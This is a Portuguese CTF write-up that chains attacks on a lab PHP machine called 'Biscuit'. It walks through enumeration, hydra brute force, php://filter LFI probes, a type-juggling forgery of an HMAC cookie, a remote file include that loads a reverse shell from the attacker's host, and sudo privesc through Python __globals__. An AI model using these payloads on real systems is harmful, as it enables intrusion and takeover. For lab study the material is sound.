---
title: "Biscuit: type juggling, cookie forging e RFI até root"
description: "Cadeia de exploração web multi-estágio: type juggling no login e no cookie HMAC, RFI para RCE, e privesc via __globals__ em Python."
date: 2026-07-09
platform: "HackingClub"
tags: ["web", "php", "type-juggling", "rfi", "privesc"]
draft: false
---

Máquina web em PHP 7.4 onde nenhum bug isolado dá o acesso: cada um é só uma porta. O caminho até root encadeia _type juggling_ no login, forja de cookie, RFI para reverse shell e, no fim, um vazamento de senha via `__globals__` de um script Python rodando como sudo.

O alvo neste writeup é `172.16.3.124` (IP interno de lab).

---

## Fase 0: Enumeração antes de tocar no login

### Portas e serviços

```bash
sudo nmap -sV -vvv -Pn 172.16.3.124
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.66 (PHP/7.4.19)
111/tcp open  rpcbind 2-4 (RPC #100000)
```

Passo fundamental para mapear a superfície de ataque. As flags:

- `-sV` mostra a versão dos serviços
- `-vvv` modo verboso
- `-Pn` não faz ping no alvo: evita que o nmap desista dos serviços por não receber ICMP reply

Duas coisas saltam: **PHP 7.4.19** (ainda vulnerável a type juggling) e a porta **111/rpcbind**.

### RPC / NFS

```bash
rpcinfo -p 172.16.3.124
```

```
program vers proto   port  service
100000    4   tcp    111  portmapper
100000    3   tcp    111  portmapper
100000    2   tcp    111  portmapper
```

Enumerar o RPC pode ser útil para escalar privilégios mais tarde. Fica anotado.

### Fingerprint web e confirmação de PHP

```bash
whatweb http://172.16.3.124
```

```
http://172.16.3.124 [200 OK] Apache[2.4.66], Cookies[PHPSESSID],
HTTPServer[Apache/2.4.66 () PHP/7.4.19], PHP[7.4.19],
PasswordField[password], Title[Login], X-Powered-By[PHP/7.4.19]
```

```bash
curl -sI http://172.16.3.124
```

```
HTTP/1.1 200 OK
Server: Apache/2.4.66 () PHP/7.4.19
X-Powered-By: PHP/7.4.19
Set-Cookie: PHPSESSID=lbbe38ijvm5m2paah9igppmfpd; path=/
Content-Type: text/html; charset=UTF-8
```

Foco nos headers de *cookies*, *X-Powered-By* e *Server*. As flags `-s` (silent) e `-I` (head) mandam um `HEAD` e retornam só os headers, sem body. Confirmado: Apache + PHP 7.4.19, e uma tela de login à frente.

### Fuzzing de diretórios

```bash
ffuf -u http://172.16.3.124/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt \
  -e .php,.txt,.bak -t 50 -fw 862
```

```
index.php
/class
```

Só um `index.php` e um diretório `/class`: este último com **directory listing ligado**. Fuzzing de parâmetros no `index.php` não retornou nada de imediato.

---

## Fase 1: Atacando o login

### Caminho A: Type juggling (o mais provável, dado o hint)

O bug clássico é o PHP comparando com `==` (frouxo) em vez de `===`. Testei mandar `0` e `true` no campo password: sem sucesso no login como admin.

> `0` só funcionaria se a senha armazenada como hash começasse com o dígito `0`, o que não é o caso aqui.

A hipótese mais forte é a comparação ser algo como:

```php
if (strcmp($_POST['password'], $senha_real) == 0) { /* login ok */ }
```

Porque `strcmp(array, string)` retorna `NULL` (com um warning), e `NULL == 0` é `true`. Ou seja: mandar o password como **array** daria bypass. Guardei a ideia.

### Caminho B: Credenciais fracas

```bash
hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
  172.16.3.124 http-post-form \
  "/:username=^USER^&password=^PASS^:F=ea4c88" -t 16 -V
```

17 usernames × ~7000 passwords, nenhum acerto.

Antes de forçar mais, checar se algum parâmetro de URL vaza arquivo (LFI via wrapper `php://filter`):

```bash
for p in page file include inc path template view lang load module dir doc content id; do
  echo -n "$p -> "
  curl -s "http://172.16.3.124/index.php?$p=php://filter/convert.base64-encode/resource=index" | grep -c 'PD9'
done
```

Todos retornaram `0`: nenhum parâmetro vaza conteúdo. Montei então uma wordlist temática (o nome da máquina é "Biscuit") para brute mais direcionado:

```
biscuit
Biscuit
biscuit123
cookie
baker
chef
bakery
cookies
biscoito
bolacha
```

### Caminho C: Dumpar o Auth.class.php do /class

Com directory listing no `/class`, tentei ler o fonte do `Auth.class.php` por duas vias. Primeiro, extensões genéricas de backup:

```bash
for ext in .bak '~' .old .save .txt .swp .phps; do
  url="http://172.16.3.124/class/Auth.class.php${ext}"
  code=$(curl -s -o /dev/null -w '%{http_code}' "$url")
  echo "$code -> $url"
done
```

Tudo `404`. Depois, o wrapper `php://filter` comparando o início do base64 com `PD9` (que decodifica para `<?php`):

```bash
for p in page file include inc path template view lang load module content doc; do
  echo -n "$p -> "
  curl -s "http://172.16.3.124/index.php?$p=php://filter/convert.base64-encode/resource=class/Auth.class" | grep -c 'PD9'
done
```

Novamente `0` em todos, e o tamanho da resposta (`wc -c`) era idêntico ao baseline `6773` para qualquer parâmetro: ou seja, nenhum estava sendo interpretado. Beco sem saída pelo fonte.

### guest:guest funciona

A credencial `guest:guest` entra. A tela não mostra nada de novo: a única diferença é um **cookie de sessão** no storage:

```
eyJobWFjIjoiNzAxNjVhZTFiODFjNGRiMDNlYTYzODRiNDYxNGUyMjQiLCJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwaXJhdGlvbiI6MTc4MzcxMjMyMX0%3D
```

### Decodando o cookie

É base64 + url-encode. Decodando:

```json
{"hmac":"70165ae1b81c4db03ea6384b4614e224","username":"guest","expiration":1783712321}
```

Estrutura clara: `hmac : username : expiration`.

### Trocando guest → admin (primeira flag)

Alterei só o `username` para `admin` e re-encodei (base64 + url-encode) antes de mandar na requisição. Resultado: erro de **cookie tampering**, e a primeira flag.

> O HMAC é uma assinatura que combina o valor do cookie com uma chave secreta. Ao mudar o `username`, a assinatura deixa de bater: por isso o app detecta a adulteração.

### Type juggling no HMAC

O mesmo `==` frouxo do login mora aqui. Se o app compara a assinatura como `$cookie['hmac'] == $hmac_calculado` e o valor recebido for o booleano `true`, então `"qualquer_string" == true` é `true` no PHP 7. Basta trocar o campo por um booleano:

```json
{"hmac": true, "username":"admin", "expiration":1783712321}
```

Re-encodado e enviado, **dá bypass na verificação** e o login como admin é aceito.

### Analisando o comportamento do app

Como admin, a página só troca "Welcome guest" por "Welcome admin". Então testei alterar o `username` para um valor arbitrário (`abcd`) para ver como o app reage:

> Erro: não foi possível encontrar o arquivo `abcd.php`.

Ouro. O `username` está sendo usado num **include**: e como PHP 7.4 com include de URL, isso abre **RFI**.

### RCE via RFI

Subo um `php-reverse-shell` no meu servidor da VPN e aponto o `username` para ele:

```json
{"hmac": true, "username":"http://<VPN-IP>/php-reverse-shell", "expiration":1783712321}
```

O include remoto executa, e cai a shell.

---

## Fase 2: Escalada de privilégio

### sudo -l

```bash
sudo -l
```

Aparece um script executável como root:

```
(root) NOPASSWD: /opt/biscuit_checker.py
```

Rodando, é um programa que bloqueia endereços IP: mas **não tenho permissão de editá-lo**. Então procurei recursivamente por algo com que ele interage, buscando arquivos com "block" no nome:

```bash
find / -iname '*block*' 2>/dev/null
```

Achei `/var/www/html/block.ips.db.json`, este sim editável.

### Vazando a senha de root via `__globals__`

Colocando um valor qualquer no `.json` e rodando o programa principal, ele solta um erro que **vaza o nome da função principal** do script. A partir daí:

> Em Python, depois de referenciar uma função, dá para acessar as variáveis globais do módulo dela via `funcao.__globals__`. Explorando o fluxo de erro do script para chegar nesse atributo, consegui ler as globais: entre elas, a **senha do usuário root**.

Com a senha em mãos, `su root` e a máquina está rootada.

---

## Fecho

Nenhum passo aqui é exótico sozinho. O que resolve a máquina é reconhecer que cada bug fraco: um `==`, um cookie assinado mal comparado, um include que confia em input, um script sudo que expõe globais: é uma porta. Encadeadas, elas vão de `guest:guest` até root.

_har har mahadev._
